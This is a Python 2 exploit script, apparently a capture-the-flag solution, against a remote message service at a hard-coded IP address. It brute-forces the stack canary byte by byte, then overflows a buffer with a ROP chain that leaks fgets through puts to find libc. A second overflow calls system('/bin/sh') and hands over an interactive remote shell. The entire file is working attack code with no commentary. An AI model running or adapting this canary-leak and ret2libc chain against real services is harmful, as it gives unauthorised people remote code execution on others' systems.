import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<Q', x)

def up(x):
    return struct.unpack('<Q', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

host = '54.178.148.88'
port = 8888

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

pop_rdi_ret = 0x400fb3
fgets_got = 0x602058
puts_plt = 0x400870

length = 506
b = []
b.append(0)

for i in range(1, 256):
	#print 'i: %s' % hex(i)
	if (i == 0x0a): continue
	readuntil(f, 'Select : ')
	f.write('2\n')
	readuntil(f, 'length: ')
	f.write(str(length) + '\n')
	readuntil(f, 'Message : ')
	f.write('\x00\x00' + ('\x00\x00' + chr(i)) * (498/3) + '\x00\x00\n')
	#16 bytes of message sent
	#t = telnetlib.Telnet()
	#t.sock = s
	#t.interact()
	ret = int(readuntil(f, ' bytes of message sent'), 10)
	#print ret
	if (ret == 19):
		b.append(i)
		break
	#readuntil(f, 'Wrong select')

print b

length += 1
for i in range(1, 256):
	if (i == 0x0a): continue
	readuntil(f, 'Select : ')
	f.write('2\n')
	readuntil(f, 'length: ')
	f.write(str(length) + '\n')
	readuntil(f, 'Message : ')
	f.write(('\x00' + chr(b[1]) + chr(i)) * (501/3) + '\x00\x00\n')
	ret = int(readuntil(f, ' bytes of message sent'), 10)
	#print 'i :%s' % hex(i)
	#print ret
	if (ret != 22):
		b.append(i)
		break

print b

length += 1
for i in range(1, 256):
	if (i == 0x0a): continue
	readuntil(f, 'Select : ')
	f.write('2\n')
	readuntil(f, 'length: ')
	f.write(str(length) + '\n')
	readuntil(f, 'Message : ')
	f.write(('\x00' + chr(b[1]) + chr(b[2]) + chr(i)) * (500/4) + '\x00\x00\x00\n')
	ret = int(readuntil(f, ' bytes of message sent'), 10)
	#print 'i :%s' % hex(i)
	#print ret
	if (ret != 24):
		b.append(i)
		break

print b

length += 1
for i in range(1, 256):
	if (i == 0x0a): continue
	readuntil(f, 'Select : ')
	f.write('2\n')
	readuntil(f, 'length: ')
	f.write(str(length) + '\n')
	readuntil(f, 'Message : ')
	f.write('\x00'*4 + ('\x00' + chr(b[1]) + chr(b[2]) + chr(b[3]) + chr(i)) * (495/5) + '\x00\x00\x00\x00\n')
	ret = int(readuntil(f, ' bytes of message sent'), 10)
	#print 'i :%s' % hex(i)
	#print ret
	if (ret != 27):
		b.append(i)
		break

print b

length += 1
for i in range(1, 256):
	if (i == 0x0a): continue
	readuntil(f, 'Select : ')
	f.write('2\n')
	readuntil(f, 'length: ')
	f.write(str(length) + '\n')
	readuntil(f, 'Message : ')
	f.write( ( '\x00' + chr(b[1]) + chr(b[2]) + chr(b[3]) + chr(b[4]) + chr(i) ) * ((504-6)/6) + '\x00\x00\x00\x00\x00\n')
	ret = int(readuntil(f, ' bytes of message sent'), 10)
	#print 'i :%s' % hex(i)
	#print ret
	if (ret != 26):
		b.append(i)
		break

print b

length += 1
for i in range(1, 256):
	if (i == 0x0a): continue
	readuntil(f, 'Select : ')
	f.write('2\n')
	readuntil(f, 'length: ')
	f.write(str(length) + '\n')
	readuntil(f, 'Message : ')
	f.write( ( '\x00' + chr(b[1]) + chr(b[2]) + chr(b[3]) + chr(b[4]) + chr(b[5]) + chr(i) ) * ((504-7)/7) + '\x00\x00\x00\x00\x00\x00\n')
	ret = int(readuntil(f, ' bytes of message sent'), 10)
	#print 'i :%s' % hex(i)
	#print ret
	if (ret != 27):
		b.append(i)
		break

print b

length += 1
for i in range(1, 256):
	if (i == 0x0a): continue
	readuntil(f, 'Select : ')
	f.write('2\n')
	readuntil(f, 'length: ')
	f.write(str(length) + '\n')
	readuntil(f, 'Message : ')
	f.write( ( '\x00' + chr(b[1]) + chr(b[2]) + chr(b[3]) + chr(b[4]) + chr(b[5]) + chr(b[6]) + chr(i) ) * ((504-8)/8) + '\x00\x00\x00\x00\x00\x00\x00\n')
	ret = int(readuntil(f, ' bytes of message sent'), 10)
	#print 'i :%s' % hex(i)
	#print ret
	if (ret != 28):
		b.append(i)
		break

canary = b[0] + b[1] * 0x100 + b[2] * 0x10000 + b[3] * 0x1000000 + b[4] * 0x100000000 + b[5] * 0x10000000000 + b[6] * 0x1000000000000 + b[7] * 0x100000000000000
print 'Stack Canary: %s' % hex(canary)

raw_input('wait')

payload1 = 'a' * 504
payload1 += p(canary)
payload1 += 'B' * 8
payload1 += p(pop_rdi_ret)
payload1 += p(fgets_got)
payload1 += p(puts_plt)
payload1 += p(0x400d6c) 

readuntil(f, 'Select : ')
f.write('1\n')
readuntil(f, 'length: ')
f.write(str(len(payload1) + 1) + '\n')
readuntil(f, 'Message : ')
f.write(payload1)

fgets_addr = up(f.read(6) + '\x00\x00')
libc_base = fgets_addr - 0x6e220
system_addr = libc_base + 0x46640
binsh_addr = libc_base + (0x17ccdb)
print 'fgets: %s' % hex(fgets_addr)

payload2 = 'a' * 504
payload2 += p(canary)
payload2 += 'B' * 8
payload2 += p(pop_rdi_ret)
payload2 += p(binsh_addr)
payload2 += p(system_addr)

readuntil(f, 'length: ')
f.write(str(len(payload2) + 1) + '\n')
readuntil(f, 'Message : ')
f.write(payload2)

#print f.read(1024).encode('hex')

t = telnetlib.Telnet()
t.sock = s
t.interact()
